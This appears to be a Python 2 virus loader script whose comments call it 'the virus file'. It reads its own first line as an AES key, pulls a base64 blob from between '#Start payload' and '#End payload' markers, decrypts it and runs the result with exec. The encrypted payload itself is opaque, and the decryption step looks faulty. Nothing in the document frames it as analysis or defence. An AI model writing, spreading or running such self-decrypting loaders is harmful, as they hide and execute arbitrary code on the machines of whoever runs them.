print "Hello0000000000000sfhldskjfhdjslakfhdjlksafhjldsakhfjads"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload